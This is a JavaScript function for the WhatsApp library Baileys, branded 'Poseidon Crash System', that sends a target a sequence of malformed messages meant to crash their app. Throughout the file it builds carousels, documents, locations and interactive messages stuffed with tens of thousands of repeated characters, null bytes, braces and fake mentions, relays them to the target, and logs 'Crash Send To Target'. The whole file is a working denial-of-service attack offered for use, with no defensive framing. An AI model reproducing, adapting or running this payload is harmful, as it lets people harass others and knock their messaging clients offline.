async function CjCrtk(sock, target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  const puqi = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/...",
                    mimetype: "image/jpeg",
                    fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                    fileLength: "178006",
                    height: 1,
                    width: 1,
                    mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                    fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                    directPath: "/o1/v/t24/f2/m234/...",
                    mediaKeyTimestamp: "1749267080",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
                    scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUj...",
                    scanLengths: [19972, 38699, 68065, 51270]
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺" + "ꦽ".repeat(100000)
                },
                footer: { text: "xnxx.clouds" },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Sent", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ xnxx.clouds }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, puqi.message, {
    participant: { jid: target },
    messageId: puqi.key.id
  });

  const cards = [];
  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./folder/video.mp4") },
    { upload: sock.waUploadToServer }
  );
  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Poseidon" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺",
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            externalAdReply: {
              title: "Poseidon Crash System",
              body: "Attack System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://Poseidon.example.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };
  for (let i = 0; i < 10; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const Msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺" },
          carouselMessage: {
            cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            stanzaId: "Poseidon-Id" + Math.floor(Math.random() * 99999),
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: ["0@s.whatsapp.net"],
            externalAdReply: {
              title: "CrashSystem",
              body: "",
              thumbnailUrl: "https://example.com/",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "https://Poseidon-ai.example.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, Msg.message, {
    participant: { jid: target },
    messageId: Msg.key.id
  });

  const crashUiPayload = {
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "꧔꧈".repeat(9000),
              version: 3
            }
          }
        }
      },
      interactiveMessage: {
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(70000)
        }
      }
    }
  };

  const crashUiMsg = generateWAMessageFromContent(target, crashUiPayload.message, { userJid: target });
  await sock.relayMessage(target, crashUiMsg.message, { messageId: crashUiMsg.key.id });
  await sleep(1500);

  const docPayload = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          title: "Poseidon_Document",
          fileName: " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺 " + "🩸".repeat(10000) + ".pdf",
          mimetype: "application/pdf",
          fileLength: "999999999",
          pageCount: 999,
          mediaKey: "PoseidonViewOnceDocumentKey",
          fileSha256: Buffer.from([]),
          fileEncSha256: Buffer.from([]),
          directPath: "/v/t62.7118-24",
          mediaKeyTimestamp: Date.now(),
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
            ),
            isForwarded: true,
            forwardingScore: 9999
          }
        }
      }
    }
  };
  await sock.relayMessage(target, docPayload, { messageId: "msg.key", participant: { jid: target } });
  await sleep(1500);

  const locationPayload = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺 ".repeat(10000),
          address: "꧔꧈".repeat(5000),
          jpegThumbnail: Buffer.from([]),
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
            ),
            isForwarded: true,
            forwardingScore: 9999
          }
        }
      }
    }
  };
  await sock.relayMessage(target, locationPayload, { messageId: "msg.key", participant: { jid: target } });
  await sleep(1500);

  const closeMessage = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝐅𝐨𝐫𝐜𝐞𝐜𝐥𝐨𝐬𝐞 🇷🇺",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: JSON.stringify({ status: true }),
              messageParamsJson: "{".repeat(10000),
              version: 3
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(closeMessage.to, closeMessage.message);

  const Poseidon = JSON.stringify({
    status: true,
    active: true,
    criador: "$FriendMe",
    messageParamsJson: "{".repeat(10000),
    call_permission_request: {
      status: true,
      enabled: true,
      version: 3,
    },
    buttons: [
      {
        name: "nested_crash",
        buttonParamsJson: JSON.stringify({
          messageParamsJson: "{".repeat(15000),
          crash: true,
          overdrive: true,
        }),
      },
      {
        name: "multi_repeat",
        buttonParamsJson: JSON.stringify({
          status: true,
          payload: Array.from({ length: 100 }, () => "{".repeat(50)),
          cameraAccess: true
        }),
      },
    ],
    flood: Array.from({ length: 1000 }, () => ({
      nulls: "\u0000".repeat(100),
      emojis: "🇷🇺".repeat(20),
      status: true,
    })),
  });

  const brutalMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝐅𝐨𝐫𝐜𝐞𝐜𝐥𝐨𝐬𝐞 🕊️ ",
              hasMediaAttachment: false,
            },
            body: {
              text: " 𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 # 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔 🇷🇺 " + "\u0000".repeat(30000),
              format: "DEFAULT",
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(15000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: Poseidon,
                },
                ...Array.from({ length: 4 }, () => ({
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                    enabled: true,
                    overload: true,
                    cameraAccess: true
                  }),
                })),
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, brutalMsg.message, {
    messageId: brutalMsg.key.id,
    participant: { jid: target },
  });

  console.log(chalk.red("CjCrtk Crash Send To Target"));
}